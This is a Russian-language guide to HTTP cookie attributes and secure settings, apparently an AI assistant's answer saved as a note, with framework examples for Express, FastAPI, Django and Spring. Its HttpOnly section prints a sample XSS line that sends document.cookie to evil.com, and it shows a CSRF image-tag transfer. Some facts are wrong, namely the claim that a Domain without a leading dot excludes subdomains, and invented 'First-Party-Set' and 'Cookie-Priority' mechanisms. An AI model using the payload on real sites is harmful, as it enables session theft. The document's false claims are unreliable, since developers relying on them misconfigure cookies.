---
aliases:
  - Cookie
  - куки
---
Куки — это механизм хранения данных на стороне клиента, но без правильной настройки они становятся **вектором для атак**. Флаги `HttpOnly`, `Secure` и `SameSite` — это **три уровня защиты**, которые превращают обычные куки в безопасные.

---

## 🍪 Что такое HTTP-куки?

**HTTP Cookie** — это небольшой фрагмент данных, который сервер отправляет браузеру через заголовок `Set-Cookie`. Браузер сохраняет его и автоматически отправляет обратно при каждом запросе к тому же домену.

```http
Set-Cookie: session_id=abc123; Path=/; Domain=example.com
```

**Проблема:** По умолчанию куки:
- Доступны JavaScript (`document.cookie`)
- Отправляются по HTTP (не только HTTPS)
- Отправляются на все поддомены и при cross-site запросах

Это открывает двери для **XSS**, **MITM** и **CSRF** атак.

---

# Cookie security flags
## 🔒 1. HttpOnly

### Что это?
Флаг, который **запрещает доступ к куки через JavaScript**.

```http
Set-Cookie: session_id=abc123; HttpOnly
```

### Как работает?
- Браузер сохраняет куку
- Кука **автоматически** отправляется в HTTP-заголовках
- Но `document.cookie` **не видит** эту куку

```javascript
// Без HttpOnly
document.cookie // "session_id=abc123; other=value"

// С HttpOnly
document.cookie // "other=value" (session_id скрыта)
```

### От чего защищает?
**XSS (Cross-Site Scripting)** — когда злоумышленник внедряет вредоносный JavaScript на страницу:

```javascript
// Атакующий пытается украсть куки
fetch('https://evil.com/steal?cookies=' + document.cookie)
```

Если кука с `HttpOnly` — JavaScript её **не увидит**, и кража не удастся.

### Когда использовать?
✅ **Всегда** для сессионных кук (`session_id`, `auth_token`)  
✅ Для любых кук, которые **не нужны** JavaScript  
❌ Не использовать, если фронтенду **действительно** нужно читать куку (редкий случай)

---

## 🔐 2. Secure

### Что это?
Флаг, который указывает браузеру отправлять куку **только по HTTPS**.

```http
Set-Cookie: session_id=abc123; Secure
```

### Как работает?
- Браузер отправляет куку только если соединение **зашифровано** (HTTPS)
- При HTTP-запросе кука **не отправляется**

```http
# HTTPS запрос - кука отправляется
GET /api/data (https://example.com)
Cookie: session_id=abc123

# HTTP запрос - кука НЕ отправляется
GET /api/data (http://example.com)
Cookie: (пусто)
```

### От чего защищает?
**MITM (Man-in-the-Middle)** — когда злоумышленник перехватывает трафик в публичной Wi-Fi сети:

```
Пользователь → [HTTP] → Злоумышленник → Сервер
                    ↑
            Видит куки в открытом виде!
```

С флагом `Secure` кука **никогда** не будет отправлена по незашифрованному каналу.

### Когда использовать?
✅ **Всегда** в продакшене (все сайты должны быть на HTTPS)  
✅ Для всех чувствительных кук (сессии, токены)  
⚠️ В dev-окружении (localhost) можно отключить для удобства

---

## 🛡️ 3. SameSite

### Что это?
Флаг, который контролирует, **когда кука отправляется при cross-site запросах** (запросах с других доменов).

```http
Set-Cookie: session_id=abc123; SameSite=Strict
```

### Три режима:

#### **SameSite=Strict** (самый строгий)
Кука отправляется **только** если запрос идет с **того же сайта** (same-site).

```javascript
// Пользователь на example.com
// Клик по ссылке на example.com/api - кука отправляется ✅

// Пользователь на evil.com
// Evil.com делает запрос к example.com/api - кука НЕ отправляется ❌
```

#### **SameSite=Lax** (умеренный, **по умолчанию в современных браузерах**)
Кука отправляется при:
- Same-site запросах ✅
- **Top-level навигации** (переход по ссылке, форма GET) с других сайтов ✅
- Cross-site AJAX/fetch запросах ❌

```javascript
// Пользователь на evil.com
// <a href="https://example.com/dashboard"> - кука отправляется ✅ (top-level)
// fetch('https://example.com/api') - кука НЕ отправляется ❌ (cross-site)
```

#### **SameSite=None** (самый слабый)
Кука отправляется **всегда**, даже при cross-site запросах. **Требует флаг `Secure`**.

```http
Set-Cookie: session_id=abc123; SameSite=None; Secure
```

### От чего защищает?
**CSRF (Cross-Site Request Forgery)** — когда злоумышленник заставляет браузер жертвы выполнить нежелательное действие:

```html
<!-- На сайте evil.com -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

Если у пользователя есть активная сессия в `bank.com`, браузер **автоматически** отправит куки, и перевод выполнится.

С `SameSite=Lax` или `Strict` — куки **не отправятся**, и атака не сработает.

### Когда использовать?
| Режим | Когда использовать |
|-------|-------------------|
| **Strict** | Максимальная безопасность, но может сломать UX (пользователь не войдет в систему при переходе по ссылке из email) |
| **Lax** | **Рекомендуется по умолчанию** для большинства сайтов |
| **None** | Только для cross-site сценариев (например, SSO, embedded widgets) + **обязательно** `Secure` |

---

## 📊 Сравнительная таблица

| Флаг | Защищает от | Как работает | Когда использовать |
|------|-------------|--------------|-------------------|
| **HttpOnly** | XSS (кража кук через JS) | Запрещает `document.cookie` | ✅ Всегда для сессионных кук |
| **Secure** | MITM (перехват трафика) | Только HTTPS | ✅ Всегда в продакшене |
| **SameSite=Strict** | CSRF (cross-site запросы) | Только same-site | Для максимальной безопасности |
| **SameSite=Lax** | CSRF (частично) | Same-site + top-level навигация | ✅ **Рекомендуется** |
| **SameSite=None** | — | Разрешает cross-site | Только для SSO/embedded + Secure |

---

## 🎯 Идеальная конфигурация

Для **сессионной куки** в продакшене:

```http
Set-Cookie: session_id=abc123; 
            Path=/; 
            Domain=example.com; 
            HttpOnly; 
            Secure; 
            SameSite=Lax;
            Max-Age=3600
```

### Разбор:
- `Path=/` — кука доступна на всех путях
- `Domain=example.com` — только для этого домена
- `HttpOnly` — защита от XSS
- `Secure` — только HTTPS
- `SameSite=Lax` — защита от CSRF
- `Max-Age=3600` — время жизни 1 час

---

## 💡 Заключение

> **HttpOnly + Secure + SameSite = минимальный стандарт безопасности для кук в 2026 году.**

- **HttpOnly** защищает от кражи кук через JavaScript (XSS)
- **Secure** защищает от перехвата трафика (MITM)
- **SameSite** защищает от подделки запросов (CSRF)

Без этих флагов ваше приложение уязвимо для **базовых атак**, которые автоматизируются скриптами за секунды.

---

# Cookie flags
# 🍪 HTTP Cookies: Полное руководство по всем флагам

**HTTP Cookie** — это механизм хранения данных на стороне клиента. Сервер устанавливает куки через заголовок `Set-Cookie`, браузер сохраняет их и автоматически отправляет при каждом подходящем запросе.

---

## 📋 Синтаксис Set-Cookie

```http
Set-Cookie: <name>=<value>; <flag1>; <flag2>=<value>; ...
```

Пример:
```http
Set-Cookie: session_id=abc123; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Lax; Max-Age=3600
```

---

## 🚩 Полный список флагов (атрибутов)

### 1. **Domain** — Область действия домена

**Что это:** Определяет, для каких доменов доступна кука.

```http
Set-Cookie: id=abc; Domain=.example.com
```

**Как работает:**
- Если **не указан**: кука работает только для точного домена запроса (host-only)
- Если указан с точкой `.example.com`: кука доступна для `example.com` и всех поддоменов (`api.example.com`, `blog.example.com`)
- **Нельзя** установить куку для чужого домена (защита от атак)

```http
# Работает
# Запрос с shop.example.com
Set-Cookie: token=xyz; Domain=.example.com

# НЕ работает (браузер отклонит)
# Запрос с example.com
Set-Cookie: token=xyz; Domain=.google.com
```

⚠️ **Важно:** Современные браузеры требуют **явного** указания поддомена. Кука с `Domain=example.com` **не** будет отправлена на `sub.example.com`, если не указано `.example.com`.

---

### 2. **Path** — Область действия пути

**Что это:** Определяет, для каких URL-путей доступна кука.

```http
Set-Cookie: admin=xyz; Path=/admin
```

**Как работает:**
- `Path=/` (по умолчанию) — кука доступна везде
- `Path=/admin` — кука отправляется только при запросах к `/admin` и его подпутям (`/admin/users`, `/admin/settings`)
- Запросы к `/api` **не получат** эту куку

```http
# Кука с Path=/admin
GET /admin/dashboard   → Cookie отправляется ✅
GET /admin/users       → Cookie отправляется ✅
GET /api/data          → Cookie НЕ отправляется ❌
GET /                  → Cookie НЕ отправляется ❌
```

**Когда использовать:**
- Разграничение сессий для разных разделов сайта
- Снижение трафика (куки не отправляются туда, где не нужны)

---

### 3. **Expires** — Дата истечения (абсолютная)

**Что это:** Указывает **конкретную дату и время**, после которой кука удаляется.

```http
Set-Cookie: id=abc; Expires=Wed, 15 Jun 2026 10:00:00 GMT
```

**Формат:** `Day, DD Mon YYYY HH:MM:SS GMT` (RFC 1123)

```http
Set-Cookie: remember_me=xyz; Expires=Fri, 31 Dec 2027 23:59:59 GMT
```

**Особенности:**
- Зависит от **часов на клиенте** (если часы сбиты — кука может истечь раньше/позже)
- Если указать дату в прошлом — кука **удалится**
- Если не указан ни `Expires`, ни `Max-Age` — это **session cookie** (удаляется при закрытии вкладки/браузера)

---

### 4. **Max-Age** — Время жизни (относительное)

**Что это:** Указывает **количество секунд** до истечения куки.

```http
Set-Cookie: id=abc; Max-Age=3600    # 1 час
Set-Cookie: remember=xyz; Max-Age=2592000  # 30 дней
Set-Cookie: logout=1; Max-Age=0     # Удалить куку немедленно
```

**Преимущества перед Expires:**
- Не зависит от часов клиента
- Проще вычислять (не нужно форматировать дату)
- **Имеет приоритет** над `Expires`, если указаны оба

```http
# Max-Age переопределит Expires
Set-Cookie: id=abc; Expires=Wed, 15 Jun 2030 10:00:00 GMT; Max-Age=60
# Кука истечет через 60 секунд, а не в 2030 году
```

---

### 5. **Secure** — Только HTTPS

**Что это:** Кука отправляется **только по зашифрованному соединению**.

```http
Set-Cookie: session_id=abc; Secure
```

**Как работает:**
- ✅ Отправляется при HTTPS-запросах
- ❌ НЕ отправляется при HTTP-запросах
- ❌ НЕ может быть установлена через HTTP (в современных браузерах)

**Когда использовать:**
- ✅ **Всегда** в продакшене
- ⚠️ В dev-окружении (localhost) можно отключить для удобства

---

### 6. **HttpOnly** — Запрет доступа через JavaScript

**Что это:** Кука недоступна через `document.cookie`.

```http
Set-Cookie: session_id=abc; HttpOnly
```

**Защищает от:** XSS-атак (кража кук через вредоносный JS)

**Когда использовать:**
- ✅ Для всех сессионных кук
- ❌ Если фронтенду **нужно** читать куку (редкий случай)

---

### 7. **SameSite** — Контроль cross-site запросов

**Что это:** Определяет, отправляется ли кука при запросах с других сайтов.

```http
Set-Cookie: session_id=abc; SameSite=Lax
```

**Три значения:**

| Значение | Когда отправляется | Защищает от CSRF |
|----------|-------------------|------------------|
| **Strict** | Только same-site запросы | ✅ Полностью |
| **Lax** | Same-site + top-level навигация (ссылки) | ✅ Частично |
| **None** | Всегда (даже cross-site) | ❌ Нет |

**Особенности:**
- `SameSite=None` **требует** `Secure`
- `Lax` — значение по умолчанию в современных браузерах
- Если `SameSite` не указан — браузер применит `Lax`

```http
# Cross-site POST запрос (например, из формы на другом сайте)
SameSite=Strict  → кука НЕ отправляется ❌
SameSite=Lax     → кука НЕ отправляется ❌
SameSite=None    → кука отправляется ✅

# Top-level GET (клик по ссылке)
SameSite=Strict  → кука НЕ отправляется ❌
SameSite=Lax     → кука отправляется ✅
SameSite=None    → кука отправляется ✅
```

---

### 8. **Partitioned** (CHIPS — Cookies Having Independent Partitioned State) 🆕

**Что это:** Создает **изолированные куки** для каждого top-level сайта. Предотвращает отслеживание пользователей между сайтами.

```http
Set-Cookie: session_id=abc; Partitioned; Secure
```

**Как работает:**
- Кука **привязывается** к top-level домену, на котором она была установлена
- Одна и та же кука на разных сайтах будет **разной**

```http
# Пользователь на site-a.com, загружает iframe с tracker.com
# Устанавливается кука: tracker_session=xyz; Partitioned

# Позже пользователь на site-b.com, загружает тот же iframe с tracker.com
# Браузер НЕ отправит tracker_session=xyz (разные партиции)
```

**Когда использовать:**
- ✅ Для embedded-виджетов (чат, комментарии)
- ✅ Для SSO-провайдеров
- ✅ Для защиты приватности пользователей

⚠️ **Требует** `Secure`. Поддерживается в Chrome, Edge, частично в других браузерах.

---

### 9. **Priority** — Приоритет куки (Chrome)

**Что это:** Указывает приоритет куки при очистке (когда браузер решает, какие куки удалить из-за нехватки места).

```http
Set-Cookie: important=xyz; Priority=High
```

**Три значения:**
- `Low` — удаляется первой
- `Medium` (по умолчанию)
- `High` — удаляется последней

```http
Set-Cookie: session_id=abc; Priority=High
Set-Cookie: preferences=xyz; Priority=Low
```

**Когда использовать:**
- Для критически важных кук (сессии, авторизация)
- Работает только в Chromium-браузерах (Chrome, Edge, Opera)

---

### 10. **Host-Only** (неявный флаг)

**Что это:** Кука доступна **только** для точного домена, на котором установлена (без поддоменов).

**Как активировать:** Просто **не указывайте** `Domain`.

```http
# Host-only кука (только для shop.example.com)
Set-Cookie: cart_id=abc
# НЕ будет отправлена на api.shop.example.com

# Domain-кука (для example.com и всех поддоменов)
Set-Cookie: cart_id=abc; Domain=.example.com
# Будет отправлена на api.shop.example.com
```

**Когда использовать:**
- ✅ Для изоляции кук между поддоменами
- ✅ По умолчанию (безопаснее)

---

## 📊 Сводная таблица всех флагов

| Флаг | Тип | Назначение | Пример |
|------|-----|-----------|--------|
| **Domain** | Строка | Домен действия | `.example.com` |
| **Path** | Строка | Путь действия | `/admin` |
| **Expires** | Дата | Абсолютное время истечения | `Wed, 15 Jun 2026 10:00:00 GMT` |
| **Max-Age** | Число | Относительное время (сек) | `3600` |
| **Secure** | Булев | Только HTTPS | `Secure` |
| **HttpOnly** | Булев | Запрет JS-доступа | `HttpOnly` |
| **SameSite** | Enum | Cross-site контроль | `Lax`, `Strict`, `None` |
| **Partitioned** | Булев | Изоляция по top-site | `Partitioned` |
| **Priority** | Enum | Приоритет очистки | `High`, `Medium`, `Low` |

---

## 🎯 Практические примеры

### 1. Идеальная сессионная кука (продакшен)

```http
Set-Cookie: session_id=eyJhbGci...;
            Path=/;
            Domain=.example.com;
            Secure;
            HttpOnly;
            SameSite=Lax;
            Max-Age=3600;
            Priority=High
```

### 2. Кука "Запомнить меня" (долгая жизнь)

```http
Set-Cookie: remember_token=xyz123;
            Path=/;
            Secure;
            HttpOnly;
            SameSite=Lax;
            Expires=Thu, 31 Dec 2026 23:59:59 GMT
```

### 3. Кука для админ-панели (ограниченный путь)

```http
Set-Cookie: admin_session=abc;
            Path=/admin;
            Secure;
            HttpOnly;
            SameSite=Strict;
            Max-Age=1800
```

### 4. Cross-site кука для SSO

```http
Set-Cookie: sso_token=xyz;
            Path=/;
            Domain=.sso-provider.com;
            Secure;
            SameSite=None;
            Max-Age=300
```

### 5. Удаление куки

```http
Set-Cookie: session_id=;
            Max-Age=0
```

---

## 🔧 Настройка в популярных фреймворках

### Express.js (Node.js)

```javascript
res.cookie('session_id', token, {
  domain: '.example.com',
  path: '/',
  maxAge: 3600000,        // миллисекунды
  secure: true,
  httpOnly: true,
  sameSite: 'lax',
  partitioned: true,      // если поддерживается
  priority: 'high'
})
```

### FastAPI (Python)

```python
from fastapi.responses import Response

response = Response()
response.set_cookie(
    key="session_id",
    value=token,
    domain=".example.com",
    path="/",
    max_age=3600,
    secure=True,
    httponly=True,
    samesite="lax"
)
```

### Django (Python)

```python
# settings.py
SESSION_COOKIE_DOMAIN = '.example.com'
SESSION_COOKIE_PATH = '/'
SESSION_COOKIE_AGE = 3600
SESSION_COOKIE_SECURE = True
SESSION_COOKIE_HTTPONLY = True
SESSION_COOKIE_SAMESITE = 'Lax'
SESSION_COOKIE_PARTITIONED = True  # Django 5.0+
```

### Spring Boot (Java)

```java
ResponseCookie cookie = ResponseCookie.from("session_id", token)
    .domain(".example.com")
    .path("/")
    .maxAge(Duration.ofHours(1))
    .secure(true)
    .httpOnly(true)
    .sameSite("Lax")
    .build();
response.addHeader(HttpHeaders.SET_COOKIE, cookie.toString());
```

---

## ⚠️ Частые ошибки

### 1. Установка куки без HTTPS с Secure
```http
# НЕ сработает в современных браузерах
Set-Cookie: id=abc; Secure
# На HTTP-сайте
```
**Решение:** Включите HTTPS или уберите `Secure` для dev.

### 2. SameSite=None без Secure
```http
# Браузер отклонит
Set-Cookie: id=abc; SameSite=None
```
**Решение:** Добавьте `Secure`.

### 3. Неправильный формат Expires
```http
# НЕ сработает
Set-Cookie: id=abc; Expires=2026-12-31
```
**Решение:** Используйте RFC 1123 формат или `Max-Age`.

### 4. Установка куки для чужого домена
```http
# Браузер отклонит (защита)
Set-Cookie: id=abc; Domain=.google.com
# С сайта example.com
```

### 5. Конфликт Max-Age и Expires
```http
# Max-Age переопределит Expires
Set-Cookie: id=abc; Expires=...; Max-Age=60
```

---

## 🆕 Экспериментальные и будущие флаги

### 1. **Cookie Deprecation** (Third-Party Cookie Phase-Out)
Браузеры постепенно отключают third-party cookies:
- Chrome: поэтапное отключение в 2025-2026
- Safari: уже блокирует
- Firefox: блокирует по умолчанию

**Альтернативы:**
- **CHIPS** (Partitioned cookies)
- **Storage Access API**
- **FedCM** (для SSO)

### 2. **Cookie Priority Headers**
Новые заголовки для управления приоритетом:
```http
Cookie-Priority: high
```

### 3. **First-Party Sets**
Группировка связанных доменов для совместного использования кук:
```http
Set-Cookie: id=abc; First-Party-Set=example.com
```

---

## 💡 Чек-лист безопасной куки

Для **продакшена** минимальная конфигурация:

```http
Set-Cookie: name=value;
            Secure;
            HttpOnly;
            SameSite=Lax;
            Max-Age=3600
```

**Расширенная (для критичных данных):**

```http
Set-Cookie: name=value;
            Domain=.example.com;
            Path=/;
            Secure;
            HttpOnly;
            SameSite=Strict;
            Max-Age=3600;
            Partitioned;
            Priority=High
```

---

## 🎯 Итог

**Все флаги куки по назначению:**

| Категория | Флаги |
|-----------|-------|
| **Область действия** | `Domain`, `Path`, `Host-Only` |
| **Время жизни** | `Expires`, `Max-Age` |
| **Безопасность** | `Secure`, `HttpOnly`, `SameSite` |
| **Приватность** | `Partitioned` |
| **Управление** | `Priority` |

> 📌 **Золотое правило:** Используйте **минимум флагов, необходимых для задачи**, но **всегда включайте** `Secure`, `HttpOnly` и `SameSite` для сессионных кук.

---

Хочешь пример **реализации refresh token rotation с куками** или **настройку CORS для работы с куками**? Напиши — подготовлю! 😊